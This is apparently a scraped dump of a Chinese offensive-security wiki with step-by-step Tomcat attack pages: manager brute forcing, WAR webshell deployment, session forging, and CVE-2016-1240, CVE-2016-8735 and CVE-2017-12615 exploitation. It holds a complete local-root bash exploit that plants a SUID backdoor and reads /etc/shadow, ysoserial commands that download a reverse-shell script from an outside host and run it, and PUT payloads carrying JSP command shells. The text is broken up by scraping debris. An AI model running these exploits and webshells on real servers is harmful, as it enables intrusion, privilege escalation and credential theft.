Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 x-insight: activate Connection: keep-alive Upgrade-Insecure-Requests: 1 Authorization: Basic YWRtaW46MTIzNDU2 在Tomcat后台登录的数据包中我们发现它会将输入的账号和密码都编码成Base64密文。 格式：用户名:密码 => admin:123456 => YWRtaW46MTIzNDU2 这里我们可以采用Metasploit中的tomcat爆破辅助模块，当然也可以用BurpSuite来爆破： 将数据包发送到Intruder模块，添加一个变量： 在设置Payload的时候要使用自定义迭代器： 由于登录令牌都是base64加密的，我们需要 [用户名]:[密码]这样的格式进行base64encde才可以发送出去，我们设置三个迭代payload分别代表：用户名、:、密码、。 第一位设置用户名这类的字典，可以多个。 第二位设置:，只需要一个即可。 第三位设置密码，可以多个。 然后设置一个编码器，选择base64这个函数： 接下来再将url编码去掉，因为在base64密文里=会被编码成%3d。 设置完毕后，我们可以爆破了： 参考链接 https://payloads.online/archivers/2017-08-17/2#tomcat-%E7%88%86%E7%A0%B4 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 18:07:22 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Tomcat/Tomcat 后台部署war木马getshell.html":{"url":"0day/Tomcat/Tomcat 后台部署war木马getshell.html","title":"Tomcat 后台部署war木马getshell","keywords":"","body":"Tomcat 后台部署war木马getshell 一、漏洞简介 二、漏洞影响 三、复现过程 在获取到令牌后，我们可以进入Tomcat后台了： 在这个后台，我们可以操作每个应用的状态……以及读取每个应用下的Session。 但是这都不是最大的安全隐患 :) 下面来讲一下如何制作war包。 war包：Java web工程，都是打成war包，进行发布，如果我们的服务器选择TOMCAT等轻量级服务器，一般就打出WAR包进行发布 先准备了一个JSP的一句话木马，安装好JDK环境，我的目录是在C:\\Program Files (x86)\\Java\\jdk1.8.0_131\\bin,这个目录下又个文件叫jar.exe。 执行:jar -cvf [war包名称].war 打包目录 我们现在已经打包好了一个WAR包。 找到Tomcat管理页面中的WAR file to deploy进行上传就可以部署了。 应用列表已经出现了我们的目录： 访问文件名即可： 参考链接 https://payloads.online/archivers/2017-08-17/2#tomcat-%E7%88%86%E7%A0%B4 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 18:17:13 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Tomcat/Apache Tomcat样例目录session操纵漏洞.html":{"url":"0day/Tomcat/Apache Tomcat样例目录session操纵漏洞.html","title":"Tomcat样例目录session操纵漏洞","keywords":"","body":"Tomcat样例目录session操纵漏洞 一、漏洞简介 在Apache tomcat中，有一个默认的example示例目录，该example目录中存着众多的样例，其中/examples/servlets/servlet/SessionExample 允许用户对Session进行操作。由于Session是存储在服务器端的用于验证用户身份的东西。所以，理论上，只要我们可以操控Session，就可以伪造任意用户身份信息。 二、漏洞影响 三、复现过程 如图，是Apache tomcat 网站根目录下的文件夹，默认是有一个examples目录的 这是examples目录下的文件 我们访问该SessionExample页面，该页面可以对Session进行操控，本来该页面是Apache tomcat用来给开发者操纵Session示例的页面。但是，如果实际生产环境中不删除该页面的话，可能存在伪造任意用户身份的漏洞。 http://127.0.0.1:8080/examples/servlets/servlet/SessionExample 那么我们来看看SessionExample页面是如何通过接收用户输入的值，来对Session进行控制的。 表单部分代码，接收用户输入的Name和Value值。 out.println(\"\"); out.print(\"\"); out.println(rb.getString(\"sessions.dataname\")); out.println(\"\"); out.println(\"\"); out.println(rb.getString(\"sessions.datavalue\")); out.println(\"\"); out.println(\"\"); out.println(\"\"); out.println(\"\"); 核心代码，将接收的用户输入的Name和Value值写入到Session中 HttpSession session = request.getSession(true); out.println(rb.getString(\"sessions.id\") + \" \" +session.getId()); out.println(\"\"); out.println(rb.getString(\"sessions.created\") + \" \"); out.println(new Date(session.getCreationTime()) +\"\"); out.println(rb.getString(\"sessions.lastaccessed\") + \"\"); out.println(new Date(session.getLastAccessedTime())); String dataName = request.getParameter(\"dataname\");//获取dataname参数的值 String dataValue = request.getParameter(\"datavalue\");//获取datavalue参数的值 if (dataName != null && dataValue != null) { session.setAttribute(dataName, dataValue);//将dataname和datavalue写入session } 也就是说，用户通过表单提交Name和Value参数，然后通过request.getParameter（）函数获取这两个参数的值，再通过session.setAttribute() 函数将Name和Value的值写入Session中。 漏洞示例 我们先来编写 login.jsp 、login_check.jsp 、 index.jsp 这三个页面，通过这三个页面来模拟一般网站身份验证的过程。 login.jsp 用户名: 密码: login_check.jsp index.jsp 我们直接打开网站后台，即 index.jsp http://127.0.0.1:8080/examples/index.jsp 发现被重定向到login.jsp了。因为我们没有登录，所以被重定向到了登录页面 打开SessionExample http://127.0.0.1:8080/examples/servlets/servlet/SessionExample 在Name of Session Attribute: 里输入 login 在Value of Session Attribute:里输入 admin 提交后显示login=admin已经写入session 再次打开index.jsp，显示成功登录 注：但是在现实生产环境中，我们很难知道服务器后端的Session中是通过什么参数(Name)和值(Value)来判断用户登录状态的。所以就是我们根本很难利用该页面来进行任意用户伪造，只是说理论上是可行的。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-21 17:30:02 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Tomcat/CVE-2016-1240.html":{"url":"0day/Tomcat/CVE-2016-1240.html","title":"（CVE-2016-1240）Tomcat本地提权漏洞","keywords":"","body":"（CVE-2016-1240）Tomcat本地提权漏洞 一、漏洞简介 Debian系统的Linux上管理员通常利用apt-get进行包管理，CVE-2016-1240这一漏洞其问题出在Tomcat的deb包中,使 deb包安装的Tomcat程序会自动为管理员安装一个启动脚本：/etc/init.d/tocat*利用该脚本，可导致攻击者通过低权限的Tomcat用户获得系统root权限！ 二、漏洞影响 Tomcat 8 三、复现过程 漏洞分析 Debian系统的Linux上管理员通常利用apt-get进行包管理，CVE-2016-1240这一漏洞其问题出在Tomcat的deb包中,使用deb包安装的Tomcat程序会自动为管理员安装一个启动脚本：/etc/init.d/tomcat.sh。利用该脚本，可导致攻击者通过低权限的Tomcat用户获得系统root权限。 现在我们查看文件 /etc/init.d/tomcat7 操作如下： 首先我们使用 Evrething搜索xshell，选中xshell.exe运行xshell，然后连接上目标机的低权限用户tomcat7，账号是tomcat7，密码是：tomcat7。 然后执行命令whoami，可以看到，现在是tomcat7的权限，也就是低权限账户 然后执行命令vim /etc/init.d/tomcat7, 然后按Esc键,接下来输入英文状态下的字符冒号: set number,找到171行。 小提示:vim是一个文本编辑器，vim /etc/init.d/tomcat7的意思是编辑/etc/init.d/文件夹下的tomcat7文件。 其造成漏洞核心代码如下： # Run the catalina.sh script as a daemon set +e touch \"$CATALINA_PID\" \"$CATALINA_BASE\"/logs/catalina.out chown $TOMCAT6_USER \"$CATALINA_PID\" \"$CATALINA_BASE\"/logs/catalina.out 我们阅读上面的shell脚本 第一行，set +e,要知道set +e是什么意思，得先清楚set -e的含义： 使用set更改shell特性时，符号\"+\"和\"-\"的作用分别是打开和关闭指定的模式,set -e的意思是若指令传回值不等于0，则立即退出shell，而set +e的意思反之 第二行，touch是创建文件夹的意思，创建了catalina.out日志文件，前面的两个字符串定位了PID和BASE，涉及到其他变量这里不做探讨 第三行，chown是改变文件夹权限的命令，它将catalina.out日志文件的所述用户更改为低权限用户 这个脚本看似是没有什么问题的。但是从上面的脚本可以得出三点信息： 这个脚本运行时的权限必然是root权限。因为普通用户是无法使用chown命令，也就是没有更高的权限。 该脚本使用touch命令创建文件，此时存在以下：文件存在、不存在、存在为符号链接等情况，当文件为符号链接时会默认地对链接的文件进行操作。 脚本运行完毕后Tomcat服务器启动，此时catalina.out这个log文件的所属用户为tomcat，所属组为root。 综述上述，这就给漏洞利用创造了可能。 接下来我们来验证是否可以利用： 当前的用户为tomcat7。这就是说我们能够更改所属用户为tomcat7的catalina.out这个log文件的内容和属性。 更改它的属性，让他指向/etc/shadow/文件夹下，现在我们创建一个指向 /etc/shadow 的符号链接。 使用命令ln -fs /etc/shadow /var/log/tomcat7/catalina.out,这时候就可以在/etc/shadow下创建一个链接，就相当于Windows的快捷方式一样。 此时我们查看文件cataline.out的内容，此时是权限不够，禁止读取cataline.out的内容的： 现在我们需要登陆root账户重启tomcat。登陆方法与登陆Tomcat7 用户相同，账号为：root, 密码为：123456 。重启Tomcat的命令为： service tomcat7 restart 重启成功之后我们再次使用低权限用户读取cataline.out的内容：使用命令 head /var/log/tomcat6/catalina.out 使用head命令可以输出文件前十行的内容，而cat命令则是预览文件的全部内容。 原理:当Tomcat服务重启时，系统默认重新加载/var/log/tomcat6/catalina.out脚本，由于此时tomcat的日志文件指向了/etc/shadow文件; 而该文件就是我们之前创建的链接文件，而链接文件属于Tomcat7这个低权限用户，因此，我们就可以查看其中内容了。 漏洞复现 本步将使用poc根据Tomcat7漏洞进行提权 poc #!/bin/bash # # Tomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit # # CVE-2016-1240 # # Discovered and coded by: # # Dawid Golunski # http://legalhackers.com # # This exploit targets Tomcat (versions 6, 7 and 8) packaging on # Debian-based distros including Debian, Ubuntu etc. # It allows attackers with a tomcat shell (e.g. obtained remotely through a # vulnerable java webapp, or locally via weak permissions on webapps in the # Tomcat webroot directories etc.) to escalate their privileges to root. # # Usage: # ./tomcat-rootprivesc-deb.sh path_to_catalina.out [-deferred] # # The exploit can used in two ways: # # -active (assumed by default) - which waits for a Tomcat restart in a loop and instantly # gains/executes a rootshell via ld.so.preload as soon as Tomcat service is restarted. # It also gives attacker a chance to execute: kill [tomcat-pid] command to force/speed up # a Tomcat restart (done manually by an admin, or potentially by some tomcat service watchdog etc.) # # -deferred (requires the -deferred switch on argv[2]) - this mode symlinks the logfile to # /etc/default/locale and exits. It removes the need for the exploit to run in a loop waiting. # Attackers can come back at a later time and check on the /etc/default/locale file. Upon a # Tomcat restart / server reboot, the file should be owned by tomcat user. The attackers can # then add arbitrary commands to the file which will be executed with root privileges by # the /etc/cron.daily/tomcatN logrotation cronjob (run daily around 6:25am on default # Ubuntu/Debian Tomcat installations). # # See full advisory for details at: # http://legalhackers.com/advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html # # Disclaimer: # For testing purposes only. Do no harm. # BACKDOORSH=\"/bin/bash\" BACKDOORPATH=\"/tmp/tomcatrootsh\" PRIVESCLIB=\"/tmp/privesclib.so\" PRIVESCSRC=\"/tmp/privesclib.c\" SUIDBIN=\"/usr/bin/sudo\" function cleanexit { # Cleanup echo -e \"\\n[+] Cleaning up...\" rm -f $PRIVESCSRC rm -f $PRIVESCLIB rm -f $TOMCATLOG touch $TOMCATLOG if [ -f /etc/ld.so.preload ]; then echo -n > /etc/ld.so.preload 2>/dev/null fi echo -e \"\\n[+] Job done. Exiting with code $1 \\n\" exit $1 } function ctrl_c() { echo -e \"\\n[+] Active exploitation aborted. Remember you can use -deferred switch for deferred exploitation.\" cleanexit 0 } #intro echo -e \"\\033[94m \\nTomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit\\nCVE-2016-1240\\n\" echo -e \"Discovered and coded by: \\n\\nDawid Golunski \\nhttp://legalhackers.com \\033[0m\" # Args if [ $# -lt 1 ]; then echo -e \"\\n[!] Exploit usage: \\n\\n$0 path_to_catalina.out [-deferred]\\n\" exit 3 fi if [ \"$2\" = \"-deferred\" ]; then mode=\"deferred\" else mode=\"active\" fi # Priv check echo -e \"\\n[+] Starting the exploit in [\\033[94m$mode\\033[0m] mode with the following privileges: \\n`id`\" id | grep -q tomcat if [ $? -ne 0 ]; then echo -e \"\\n[!] You need to execute the exploit as tomcat user! Exiting.\\n\" exit 3 fi # Set target paths TOMCATLOG=\"$1\" if [ ! -f $TOMCATLOG ]; then echo -e \"\\n[!] The specified Tomcat catalina.out log ($TOMCATLOG) doesn't exist. Try again.\\n\" exit 3 fi echo -e \"\\n[+] Target Tomcat log file set to $TOMCATLOG\" # [ Deferred exploitation ] # Symlink the log file to /etc/default/locale file which gets executed daily on default # tomcat installations on Debian/Ubuntu by the /etc/cron.daily/tomcatN logrotation cronjob around 6:25am. # Attackers can freely add their commands to the /etc/default/locale script after Tomcat has been # restarted and file owner gets changed. if [ \"$mode\" = \"deferred\" ]; then rm -f $TOMCATLOG && ln -s /etc/default/locale $TOMCATLOG if [ $? -ne 0 ]; then echo -e \"\\n[!] Couldn't remove the $TOMCATLOG file or create a symlink.\" cleanexit 3 fi echo -e \"\\n[+] Symlink created at: \\n`ls -l $TOMCATLOG`\" echo -e \"\\n[+] The current owner of the file is: \\n`ls -l /etc/default/locale`\" echo -ne \"\\n[+] Keep an eye on the owner change on /etc/default/locale . After the Tomcat restart / system reboot\" echo -ne \"\\n you'll be able to add arbitrary commands to the file which will get executed with root privileges\" echo -ne \"\\n at ~6:25am by the /etc/cron.daily/tomcatN log rotation cron. See also -active mode if you can't wait ;) \\n\\n\" exit 0 fi # [ Active exploitation ] trap ctrl_c INT # Compile privesc preload library echo -e \"\\n[+] Compiling the privesc shared library ($PRIVESCSRC)\" cat $PRIVESCSRC #define _GNU_SOURCE #include #include #include #include uid_t geteuid(void) { static uid_t (*old_geteuid)(); old_geteuid = dlsym(RTLD_NEXT, \"geteuid\"); if ( old_geteuid() == 0 ) { chown(\"$BACKDOORPATH\", 0, 0); chmod(\"$BACKDOORPATH\", 04777); unlink(\"/etc/ld.so.preload\"); } return old_geteuid(); } _solibeof_ gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl if [ $? -ne 0 ]; then echo -e \"\\n[!] Failed to compile the privesc lib $PRIVESCSRC.\" cleanexit 2; fi # Prepare backdoor shell cp $BACKDOORSH $BACKDOORPATH echo -e \"\\n[+] Backdoor/low-priv shell installed at: \\n`ls -l $BACKDOORPATH`\" # Safety check if [ -f /etc/ld.so.preload ]; then echo -e \"\\n[!] /etc/ld.so.preload already exists. Exiting for safety.\" cleanexit 2 fi # Symlink the log file to ld.so.preload rm -f $TOMCATLOG && ln -s /etc/ld.so.preload $TOMCATLOG if [ $? -ne 0 ]; then echo -e \"\\n[!] Couldn't remove the $TOMCATLOG file or create a symlink.\" cleanexit 3 fi echo -e \"\\n[+] Symlink created at: \\n`ls -l $TOMCATLOG`\" # Wait for Tomcat to re-open the logs echo -ne \"\\n[+] Waiting for Tomcat to re-open the logs/Tomcat service restart...\" echo -e \"\\nYou could speed things up by executing : kill [Tomcat-pid] (as tomcat user) if needed ;) \" while :; do sleep 0.1 if [ -f /etc/ld.so.preload ]; then echo $PRIVESCLIB > /etc/ld.so.preload break; fi done # /etc/ld.so.preload file should be owned by tomcat user at this point # Inject the privesc.so shared library to escalate privileges echo $PRIVESCLIB > /etc/ld.so.preload echo -e \"\\n[+] Tomcat restarted. The /etc/ld.so.preload file got created with tomcat privileges: \\n`ls -l /etc/ld.so.preload`\" echo -e \"\\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload\" echo -e \"\\n[+] The /etc/ld.so.preload file now contains: \\n`cat /etc/ld.so.preload`\" # Escalating privileges via the SUID binary (e.g. /usr/bin/sudo) echo -e \"\\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!\" sudo --help 2>/dev/null >/dev/null # Check for the rootshell ls -l $BACKDOORPATH | grep rws | grep -q root if [ $? -eq 0 ]; then echo -e \"\\n[+] Rootshell got assigned root SUID perms at: \\n`ls -l $BACKDOORPATH`\" echo -e \"\\n\\033[94mPlease tell me you're seeing this too ;) \\033[0m\" else echo -e \"\\n[!] Failed to get root\" cleanexit 2 fi # Execute the rootshell echo -e \"\\n[+] Executing the rootshell $BACKDOORPATH now! \\n\" $BACKDOORPATH -p -c \"rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB\" $BACKDOORPATH -p # Job done. cleanexit 0 poc运行示例： tomcat7@ubuntu:/tmp$ id uid=110(tomcat7) gid=118(tomcat7) groups=118(tomcat7) tomcat7@ubuntu:/tmp$ lsb_release -a No LSB modules are available. Distributor ID: Ubuntu Description: Ubuntu 16.04 LTS Release: 16.04 Codename: xenial tomcat7@ubuntu:/tmp$ dpkg -l | grep tomcat ii libtomcat7-java 7.0.68-1ubuntu0.1 all Servlet and JSP engine -- core libraries ii tomcat7 7.0.68-1ubuntu0.1 all Servlet and JSP engine ii tomcat7-common 7.0.68-1ubuntu0.1 all Servlet and JSP engine -- common files tomcat7@ubuntu:/tmp$ ./tomcat-rootprivesc-deb.sh /var/log/tomcat7/catalina.out Tomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit CVE-2016-1240 Discovered and coded by: Dawid Golunski http://legalhackers.com [+] Starting the exploit in [active] mode with the following privileges: uid=110(tomcat7) gid=118(tomcat7) groups=118(tomcat7) [+] Target Tomcat log file set to /var/log/tomcat7/catalina.out [+] Compiling the privesc shared library (/tmp/privesclib.c) [+] Backdoor/low-priv shell installed at: -rwxr-xr-x 1 tomcat7 tomcat7 1037464 Sep 30 22:27 /tmp/tomcatrootsh [+] Symlink created at: lrwxrwxrwx 1 tomcat7 tomcat7 18 Sep 30 22:27 /var/log/tomcat7/catalina.out -> /etc/ld.so.preload [+] Waiting for Tomcat to re-open the logs/Tomcat service restart... You could speed things up by executing : kill [Tomcat-pid] (as tomcat user) if needed ;) [+] Tomcat restarted. The /etc/ld.so.preload file got created with tomcat privileges: -rw-r--r-- 1 tomcat7 root 19 Sep 30 22:28 /etc/ld.so.preload [+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload [+] The /etc/ld.so.preload file now contains: /tmp/privesclib.so [+] Escalating privileges via the /usr/bin/sudo SUID binary to get root! [+] Rootshell got assigned root SUID perms at: -rwsrwxrwx 1 root root 1037464 Sep 30 22:27 /tmp/tomcatrootsh Please tell me you're seeing this too ;) [+] Executing the rootshell /tmp/tomcatrootsh now! tomcatrootsh-4.3# id uid=110(tomcat7) gid=118(tomcat7) euid=0(root) groups=118(tomcat7) tomcatrootsh-4.3# whoami root tomcatrootsh-4.3# head -n3 /etc/shadow root:$6$oaf[cut]:16912:0:99999:7::: daemon:*:16912:0:99999:7::: bin:*:16912:0:99999:7::: tomcatrootsh-4.3# exit exit 首先我们下载poc文件，然后执行命令cd /tmp进入目录,然后编辑文件vim poc.sh。将桌面的poc.sh使用Notepad++打开，将文件内容粘贴进去。然后按键盘Esc键，再输入:wq，之后按 Enter 键将文件保存。 如果无法写入文件，使用命令 chmod 755 poc.sh 执行命令后，再次重复上一步即可，chmod的意思是改变文件的权限，775是什么权限呢？第一个数字代表文件所属者的权限，第二个数字代表文件所属者所在组的权限，第三个数字代表其它用户的权限，7=4+2+1 4：执行时设置用户ID，用于授权给基于文件属主的进程，而不是给创建此进程的用户。 2：执行时设置用户组ID，用于授权给基于文件所在组的进程，而不是基于创建此进程的用户。 1：设置粘着位。 这时，poc文件就已经构造好了，接下来运行脚本运行命令为： ./poc.sh /var/log/tomcat7/catalina.out 运行之后，会出现卡顿现象，这时候我们切换到root用户，重新启动Tomcat7，这时候使用命令whoami查看当前用户，这时候已经是 root 用户了，这时候就提权成功了 可以看到，命令提示符的开头为tomcat低权限用户，而我们执行whoami命令的时候，显示的权限却是root，这样就成功的提权了。 参考链接 https://www.jianshu.com/p/94e4feac245f 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-21 17:29:58 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Tomcat/CVE-2016-8735.html":{"url":"0day/Tomcat/CVE-2016-8735.html","title":"（CVE-2016-8735）Tomcat 反序列化漏洞","keywords":"","body":"（CVE-2016-8735）Tomcat 反序列化漏洞 一、漏洞简介 该漏洞与之前Oracle发布的mxRemoteLifecycleListener反序列化漏洞（CVE-2016-3427）相关，是由于使用了JmxRemoteLifecycleListener的监听功能所导致。而在Oracle官方发布修复后，Tomcat未能及时修复更新而导致的远程代码执行。 该漏洞所造成的最根本原因是Tomcat在配置JMX做监控时使用了JmxRemoteLifecycleListener的方法。 二、漏洞影响 ApacheTomcat 9.0.0.M1 到9.0.0.M11 ApacheTomcat 8.5.0 到8.5.6 ApacheTomcat 8.0.0.RC1 到8.0.38 ApacheTomcat 7.0.0 到7.0.72 ApacheTomcat 6.0.0 到6.0.47 三、复现过程 漏洞利用条件： 外部需要开启JmxRemoteLifecycleListener监听的10001和10002端口，来实现远程代码执行。 构造命令 Win ping一次命令： ping -n 1 qjkpla.ceye.io Linux ping 一次命令： ping -c 1 qjkpla.ceye.io 利用Ceye回显看是否存在漏洞: java -cp ysoserial-0.0.4-all.jar ysoserial.exploit.RMIRegistryExploit 漏洞IP 端口 Groovy1 \"ping -c Groovy1.test.qjkpla.ceye.io\" DNS回显能返回数据，说明执行了Ping命令，也就是说漏洞存在 直接NC监听服务： nc -l -vv 12555 然后构造命令：下载我们的反弹脚本:(之前用bash命令反弹没有成功所以使用Python脚本进行反弹) java -cp ysoserial-0.0.4-all.jar ysoserial.exploit.RMIRegistryExploit 漏洞IP 端口 Groovy1 \"wget http://rinige.com/back.py -O /tmp/x.py\" 执行完此命令继续构造命令，去执行刚在wget的脚本 java -cp ysoserial-0.0.4-all.jar ysoserial.exploit.RMIRegistryExploit 漏洞IP 端口Groovy1 \"python /tmp/x.py 反弹主机地址 反弹端口\" 成功反弹： 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-21 17:29:55 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Tomcat/CVE-2017-12615.html":{"url":"0day/Tomcat/CVE-2017-12615.html","title":"（CVE-2017-12615）Tomcat PUT方法任意文件写入漏洞","keywords":"","body":"（CVE-2017-12615）Tomcat PUT方法任意文件写入漏洞 一、漏洞简介 当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。 二、漏洞影响 Apache Tomcat 7.0.0 – 7.0.81 三、复现过程 漏洞复现 1.环境搭建： （1)先安装jdk。（因为Tomcat需要java环境支持） jdk8下载地址 http://www.liangchan.net/soft/download.asp?softid=9366&downid=8&id=9430 12 (2)双击jdk安装包，一直下一步安装即可(默认是会配置环境变量的) (3)安装完可以自己测试一下： (4)安装Tomcat Tomcat 7.0.79 安装包下载地址：http://www.liangchan.net/soft/download.asp?softid=9366&downid=8&id=9430 12 (5)双击安装包，一直下一步默认即可 (6)安装完成后启动服务，访问http://127.0.0.1:8080 验证一下是否成功 (7)Tomcat服务器配置。打开Tomcat安装目录下的 /conf/web.xml 添加如下配置： 漏洞利用 上传姿势一： 参考思路:微软MSDN上关于NTFS Streams的一段资料https://msdn.microsoft.com/en-us/library/dn393272.aspx 大概意思: NTFS卷上的所有文件至少包含一个流 - 主流 - 这是存储数据的普通可查看文件。流的全名是以下形式。 Copy to clipboard：： 默认数据流没有名称。也就是说，名为sample.txt的文件的默认流的完全限定名称是ample.txt :: $ DATA，因为sample.txt是文件的名称，$ DATA&是流类型。 用户可以在文件中创建命名流，并将$ DATA创建为合法名称。这意味着对于此流，全名是sample.txt：$ DATA：$ DATA。如果用户创建了名为bar的命名流，则其全名为sample.txt：bar：$ DATA。文件名的任何合法字符对于流名称（包括空格）都是合法的。 对于目录，没有默认数据流，但有一个默认目录流。目录是流类型$ INDEX_ALLOCATION。$ INDEX_ALLOCATION类型（目录流）的默认流名称是$ I30。（这与$ DATA流的默认流名称形成对比，后者具有空的流名称。）以下是等效的： Copy to clipboardDir C：\\ Users Dir C：\\ Users：$ I30：$ INDEX_ALLOCATION Dir C：\\ Users :: $ INDEX_ALLOCATION 虽然目录没有默认数据流，但它们可以具有命名数据流。这些备用数据流通常不可见，但可以使用DIR命令的/ R选项从命令行观察。 payload: PUT /shell.jsp::$DATA HTTP/1.1 Host: 172.26.1.8:8080 Content-Length: 662 \"+excuteCmd(request.getParameter(\"cmd\"))+\"\");}else{out.println(\":-)\");}%> 我们利用burpsuite来发送我们的payload 可以看到返回响应码201，说明我们上传成功了。我们访问我们jsp脚本试试： 看到可以命令执行(我们上传的payload是命令执行的脚本)，我们也可以上传一个jsp的webshell 上传姿势二： 我们知道servlet在识别1.jsp/时会把它当作非jsp文件交给DefaultServlet 来处理，而后续保存文件的时候，文件名不接受/字符，故而忽略掉 payload：(这次我们演示上传一个webshell) PUT /webshell.jsp/ HTTP/1.1 Host: 172.26.1.8:8080 Content-Length: 6239 4) { c.setCatalog(x[4]); } return c; } } void AA(StringBuffer sb) throws Exception { File k = new File(\"\"); File r[] = k.listRoots(); for (int i = 0; i \" + \"|\").getBytes(), 0, 3); while ((n = is.read(b, 0, 512)) != -1) { os.write(b, 0, n); } os.write((\"|\" + \"5?x[5]:x[4]:null, \"%\", new String[]{\"TABLE\"}); while (r.next()) { sb.append(r.getString(\"TABLE_NAME\") + \"\\t|\\t\\r\\n\"); } r.close(); c.close(); } void PP(String s, StringBuffer sb) throws Exception { String[] x = s.trim().split(\"\\r\\n\"); Connection c = GC(s); Statement m = c.createStatement(1005, 1007); ResultSet r = m.executeQuery(\"select * from \" + x[x.length-1]); ResultSetMetaData d = r.getMetaData(); for (int i = 1; i \" + \"|\"); String s = request.getSession().getServletContext().getRealPath(\"/\"); if (Z.equals(\"A\")) { sb.append(s + \"\\t\"); if (!s.substring(0, 1).equals(\"/\")) { AA(sb); } } else if (Z.equals(\"B\")) { BB(z1, sb); } else if (Z.equals(\"C\")) { String l = \"\"; BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1)))); while ((l = br.readLine()) != null) { sb.append(l + \"\\r\\n\"); } br.close(); } else if (Z.equals(\"D\")) { BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1)))); bw.write(z2); bw.close(); sb.append(\"1\"); } else if (Z.equals(\"E\")) { EE(z1); sb.append(\"1\"); } else if (Z.equals(\"F\")) { FF(z1, response); } else if (Z.equals(\"G\")) { GG(z1, z2); sb.append(\"1\"); } else if (Z.equals(\"H\")) { HH(z1, z2); sb.append(\"1\"); } else if (Z.equals(\"I\")) { II(z1, z2); sb.append(\"1\"); } else if (Z.equals(\"J\")) { JJ(z1); sb.append(\"1\"); } else if (Z.equals(\"K\")) { KK(z1, z2); sb.append(\"1\"); } else if (Z.equals(\"L\")) { LL(z1, z2); sb.append(\"1\"); } else if (Z.equals(\"M\")) { String[] c = { z1.substring(2), z1.substring(0, 2), z2 }; Process p = Runtime.getRuntime().exec(c); MM(p.getInputStream(), sb); MM(p.getErrorStream(), sb); } else if (Z.equals(\"N\")) { NN(z1, sb); } else if (Z.equals(\"O\")) { OO(z1, sb); } else if (Z.equals(\"P\")) { PP(z1, sb); } else if (Z.equals(\"Q\")) { QQ(cs, z1, z2, sb,z2.indexOf(\"-to:\")!=-1?z2.substring(z2.indexOf(\"-to:\")+4,z2.length()):s.replaceAll(\"\\\\\\\\\", \"/\")+\"images/\"); } } catch (Exception e) { sb.append(\"ERROR\" + \":// \" + e.toString()); } sb.append(\"|\" + \" 我们还是利用burpsuite发送我们构造的payload： 我们可以看到响应码为201，说明成功创建，我们用菜刀连接看一下： 验证脚本 https://github.com/ianxtianxt/CVE-2017-12615 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-25 13:08:47 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Tomcat/CVE-2018-1305.html":{"url":"0day/Tomcat/CVE-2018-1305.html","title":"（CVE-2018-1305）Tomcat 安全绕过漏洞","keywords":"","body":"（CVE-2018-1305）Tomcat 安全绕过漏洞 一、漏洞简介 近日，Apache发布安全公告称Apache Tomcat 7、8、9多个版本存在安全绕过漏洞。攻击者可以利用这个问题，绕过某些安全限制来执行未经授权的操作，这可能有助于进一步攻击。 Apache Tomcat servlet 注释定义的安全约束，只在servlet加载后才应用一次。由于以这种方式定义的安全约束，应用于URL模式及该点下任何URL，很可能取决于servlet加载的次序，这可能会将资源暴露给未经授权访问它们的用户。 二、漏洞影响 Apache Tomcat Apache Tomcat Apache Tomcat Apache Tomcat 三、复现过程 Java EE 提供了类似 ACL 权限检查的ServletSecurity注解，可以用于修饰Servlet对其进行保护，如果有两个servlet，Servlet1，访问路径为“/servlet1/”并且添加了ServletSecurity注解，Servlet2，访问路径为“/servlet1/servlet2/”但没有ServletSecurity注解，首次访问servlet1/servlet2，servlet1的ServletSecurity注解并不会生效，无法保护“/servlet1/servlet2”路径，因此可能会导致未授权访问。 如果在访问“/servlet1/servlet2”之前先访问过“/servlet1”，Tomcat会加载ACL并启动对“/servlet1/servlet2”的保护，则漏洞不会触发。 在Servlet1前加上ServletSecurity注解，Servlet2无此注解。 将web.xml文件中servlet相对应的url-pattern修改为如下图所示后。 运行该项目。首次访问servlet2的URL，发现可以未授权访问，针对servlet1的ACL并未生效。 http://localhost:8080/CVE-2018-1305/servlet1/servlet2/ 第二次访问servlet1的URL，访问被禁止，此时ACL生效。 http://localhost:8080/CVE-2018-1305/servlet1/ 再次访问servlet2的URL，发现访问被禁止，如果ACL对servlet2生效，必须建立在servlet1被访问过的前提下。 http://localhost:8080/CVE-2018-1305/servlet1/servlet2/ 漏洞演示 